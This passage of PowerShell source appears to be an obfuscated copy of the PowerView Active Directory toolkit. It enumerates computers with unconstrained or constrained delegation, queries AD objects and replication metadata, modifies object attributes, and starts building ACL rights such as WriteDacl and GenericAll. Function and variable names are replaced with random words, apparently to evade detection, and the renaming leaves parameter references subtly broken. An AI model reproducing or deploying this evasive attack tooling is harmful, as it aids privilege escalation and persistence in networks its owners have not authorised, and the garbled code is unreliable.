        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $qUscGOlo99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            pecuniary -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($qUscGOlo99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^S-1-') {
                    $OfuxkWWH99 += "(objectsid=$svVwDJqZ99)"
                }
                elseif ($svVwDJqZ99 -match '^CN=') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[undergrad] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $qUscGOlo99 = misbehaves @SearcherArguments
                        if (-not $qUscGOlo99) {
                            Write-Warning "[undergrad] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                elseif ($svVwDJqZ99.Contains('.')) {
                    $OfuxkWWH99 += "(|(name=$svVwDJqZ99)(dnshostname=$svVwDJqZ99))"
                }
                elseif ($svVwDJqZ99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $TsiMgfqm99 = (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                }
                else {
                    $OfuxkWWH99 += "(name=$svVwDJqZ99)"
                }
            }
            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[undergrad] Searching for computers with for unconstrained delegation'
                $HLDsNhab99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[undergrad] Searching for computers that are trusted to authenticate for other principals'
                $HLDsNhab99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[undergrad] Searching for printers'
                $HLDsNhab99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[undergrad] Searching for computers with SPN: $SPN"
                $HLDsNhab99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[undergrad] Searching for computers with operating system: $kOjIFfIK99"
                $HLDsNhab99 += "(operatingsystem=$kOjIFfIK99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[undergrad] Searching for computers with service pack: $iZbiKaWr99"
                $HLDsNhab99 += "(operatingsystemservicepack=$iZbiKaWr99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[undergrad] Searching for computers with site name: $UHxOuyqA99"
                $HLDsNhab99 += "(serverreferencebl=$UHxOuyqA99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[undergrad] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }
            $aAspXtoB99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $qBymjplF99 = $_.Substring(4)
                    $pLCGACce99 = [Int]($CUtwcuxc99::$qBymjplF99)
                    $HLDsNhab99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$pLCGACce99))"
                }
                else {
                    $pLCGACce99 = [Int]($CUtwcuxc99::$_)
                    $HLDsNhab99 += "(userAccountControl:1.2.840.113556.1.4.803:=$pLCGACce99)"
                }
            }

            $qUscGOlo99.filter = "(&(samAccountType=805306369)$HLDsNhab99)"
            Write-Verbose "[undergrad] undergrad filter string: $($qUscGOlo99.filter)"

            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $qUscGOlo99.FindOne() }
            else { $DEbeunXw99 = $qUscGOlo99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $BoJggNks99 = $_
                        $BoJggNks99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $BoJggNks99 = Jagger -Properties $_.Properties
                        $BoJggNks99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $BoJggNks99
                }
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[undergrad] Error disposing of the Results object: $_"
                }
            }
            $qUscGOlo99.dispose()
        }
    }
}


function nostrums {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $zDGJtxPl99 = [Enum]::GetNames($CUtwcuxc99)
        $zDGJtxPl99 = $zDGJtxPl99 | ForEach-Object {$_; "NOT_$_"}
        pecuniary -Name UACFilter -ValidateSet $zDGJtxPl99 -Type ([array])
    }

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $ypPRKyaW99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            pecuniary -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ypPRKyaW99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^S-1-') {
                    $OfuxkWWH99 += "(objectsid=$svVwDJqZ99)"
                }
                elseif ($svVwDJqZ99 -match '^(CN|OU|DC)=') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[nostrums] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $ypPRKyaW99 = misbehaves @SearcherArguments
                        if (-not $ypPRKyaW99) {
                            Write-Warning "[nostrums] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                elseif ($svVwDJqZ99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $TsiMgfqm99 = (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                }
                elseif ($svVwDJqZ99.Contains('\')) {
                    $oGNyGKhb99 = $svVwDJqZ99.Replace('\28', '(').Replace('\29', ')') | oared -OutputType Canonical
                    if ($oGNyGKhb99) {
                        $TlvSsCMq99 = $oGNyGKhb99.SubString(0, $oGNyGKhb99.IndexOf('/'))
                        $FabcFZmH99 = $svVwDJqZ99.Split('\')[1]
                        $OfuxkWWH99 += "(samAccountName=$FabcFZmH99)"
                        $nlvvSWoK99['Domain'] = $TlvSsCMq99
                        Write-Verbose "[nostrums] Extracted domain '$TlvSsCMq99' from '$svVwDJqZ99'"
                        $ypPRKyaW99 = misbehaves @SearcherArguments
                    }
                }
                elseif ($svVwDJqZ99.Contains('.')) {
                    $OfuxkWWH99 += "(|(samAccountName=$svVwDJqZ99)(name=$svVwDJqZ99)(dnshostname=$svVwDJqZ99))"
                }
                else {
                    $OfuxkWWH99 += "(|(samAccountName=$svVwDJqZ99)(name=$svVwDJqZ99)(displayname=$svVwDJqZ99))"
                }
            }
            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[nostrums] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }

            $aAspXtoB99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $qBymjplF99 = $_.Substring(4)
                    $pLCGACce99 = [Int]($CUtwcuxc99::$qBymjplF99)
                    $HLDsNhab99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$pLCGACce99))"
                }
                else {
                    $pLCGACce99 = [Int]($CUtwcuxc99::$_)
                    $HLDsNhab99 += "(userAccountControl:1.2.840.113556.1.4.803:=$pLCGACce99)"
                }
            }

            if ($HLDsNhab99 -and $HLDsNhab99 -ne '') {
                $ypPRKyaW99.filter = "(&$HLDsNhab99)"
            }
            Write-Verbose "[nostrums] nostrums filter string: $($ypPRKyaW99.filter)"

            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $ypPRKyaW99.FindOne() }
            else { $DEbeunXw99 = $ypPRKyaW99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Jagger -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[nostrums] Error disposing of the Results object: $_"
                }
            }
            $ypPRKyaW99.dispose()
        }
    }
}


function Bork {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['FindOne']) { $nlvvSWoK99['FindOne'] = $dmDYWlHe99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['Properties']) {
            $VgjRVAyI99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $VgjRVAyI99 = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $nlvvSWoK99['Identity'] = $lmPsrtYT99 }

        nostrums @SearcherArguments | ForEach-Object {
            $PpMDEFqG99 = $_.Properties['distinguishedname'][0]
            ForEach($ZJAVlGUh99 in $_.Properties['msds-replattributemetadata']) {
                $dZONjLgn99 = [xml]$ZJAVlGUh99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($dZONjLgn99) {
                    if ($dZONjLgn99.pszAttributeName -Match $VgjRVAyI99) {
                        $MWaxCMux99 = New-Object PSObject
                        $MWaxCMux99 | Add-Member NoteProperty 'ObjectDN' $PpMDEFqG99
                        $MWaxCMux99 | Add-Member NoteProperty 'AttributeName' $dZONjLgn99.pszAttributeName
                        $MWaxCMux99 | Add-Member NoteProperty 'LastOriginatingChange' $dZONjLgn99.ftimeLastOriginatingChange
                        $MWaxCMux99 | Add-Member NoteProperty 'Version' $dZONjLgn99.dwVersion
                        $MWaxCMux99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $dZONjLgn99.pszLastOriginatingDsaDN
                        $MWaxCMux99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $MWaxCMux99
                    }
                }
                else {
                    Write-Verbose "[Bork] Error retrieving 'msds-replattributemetadata' for '$PpMDEFqG99'"
                }
            }
        }
    }
}


function unseemly {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['Properties']) {
            $VgjRVAyI99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $VgjRVAyI99 = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $nlvvSWoK99['Identity'] = $lmPsrtYT99 }

        nostrums @SearcherArguments | ForEach-Object {
            $PpMDEFqG99 = $_.Properties['distinguishedname'][0]
            ForEach($ZJAVlGUh99 in $_.Properties['msds-replvaluemetadata']) {
                $dZONjLgn99 = [xml]$ZJAVlGUh99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($dZONjLgn99) {
                    if ($dZONjLgn99.pszAttributeName -Match $VgjRVAyI99) {
                        $MWaxCMux99 = New-Object PSObject
                        $MWaxCMux99 | Add-Member NoteProperty 'ObjectDN' $PpMDEFqG99
                        $MWaxCMux99 | Add-Member NoteProperty 'AttributeName' $dZONjLgn99.pszAttributeName
                        $MWaxCMux99 | Add-Member NoteProperty 'AttributeValue' $dZONjLgn99.pszObjectDn
                        $MWaxCMux99 | Add-Member NoteProperty 'TimeCreated' $dZONjLgn99.ftimeCreated
                        $MWaxCMux99 | Add-Member NoteProperty 'TimeDeleted' $dZONjLgn99.ftimeDeleted
                        $MWaxCMux99 | Add-Member NoteProperty 'LastOriginatingChange' $dZONjLgn99.ftimeLastOriginatingChange
                        $MWaxCMux99 | Add-Member NoteProperty 'Version' $dZONjLgn99.dwVersion
                        $MWaxCMux99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $dZONjLgn99.pszLastOriginatingDsaDN
                        $MWaxCMux99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $MWaxCMux99
                    }
                }
                else {
                    Write-Verbose "[unseemly] Error retrieving 'msds-replvaluemetadata' for '$PpMDEFqG99'"
                }
            }
        }
    }
}


function neared {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $lmPsrtYT99,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $nlvvSWoK99['Identity'] = $lmPsrtYT99 }

        $hPnMOrXw99 = nostrums @SearcherArguments

        ForEach ($Object in $hPnMOrXw99) {

            $Entry = $hPnMOrXw99.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[neared] Setting '$($_.Name)' to '$($_.Value)' for object '$($hPnMOrXw99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[neared] Error setting/replacing properties for object '$($hPnMOrXw99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $BgXbNURw99 = $_.Name
                        $EcGOsOPf99 = $_.Value
                        Write-Verbose "[neared] XORing '$BgXbNURw99' with '$EcGOsOPf99' for object '$($hPnMOrXw99.Properties.samaccountname)'"
                        $XVPpHylu99 = $Entry.$BgXbNURw99[0].GetType().name

                        $adSVZgnh99 = $($Entry.$BgXbNURw99) -bxor $EcGOsOPf99
                        $Entry.$BgXbNURw99 = $adSVZgnh99 -as $XVPpHylu99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[neared] Error XOR'ing properties for object '$($hPnMOrXw99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $BgXbNURw99 = $_
                        Write-Verbose "[neared] Clearing '$BgXbNURw99' for object '$($hPnMOrXw99.Properties.samaccountname)'"
                        $Entry.$BgXbNURw99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[neared] Error clearing properties for object '$($hPnMOrXw99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function jigsaw {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $ncOYrSXs99
    )

    Begin {
        if($ncOYrSXs99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function mistrusts {
            Param (
                [int[]]
                $KWuTNYpy99
            )

            $zBxppxoq99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $KWuTNYpy99[$i]
                $ZdQQYlky99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $zBxppxoq99[$ZdQQYlky99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $zBxppxoq99[$ZdQQYlky99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $zBxppxoq99[$ZdQQYlky99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $zBxppxoq99[$ZdQQYlky99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $zBxppxoq99[$ZdQQYlky99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $zBxppxoq99[$ZdQQYlky99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $zBxppxoq99[$ZdQQYlky99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $zBxppxoq99[$ZdQQYlky99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $zBxppxoq99
        }
    }

    Process {
        $MWaxCMux99 = @{
            Sunday = mistrusts -HoursArr $ncOYrSXs99[0..2]
            Monday = mistrusts -HoursArr $ncOYrSXs99[3..5]
            Tuesday = mistrusts -HoursArr $ncOYrSXs99[6..8]
            Wednesday = mistrusts -HoursArr $ncOYrSXs99[9..11]
            Thurs = mistrusts -HoursArr $ncOYrSXs99[12..14]
            Friday = mistrusts -HoursArr $ncOYrSXs99[15..17]
            Saturday = mistrusts -HoursArr $ncOYrSXs99[18..20]
        }

        $MWaxCMux99 = New-Object PSObject -Property $MWaxCMux99
        $MWaxCMux99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $MWaxCMux99
    }
}


function trundling {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $pVOfwkUl99,

        [ValidateNotNullOrEmpty()]
        [String]
        $CkVWSEJU99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $kZuTIZJV99,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
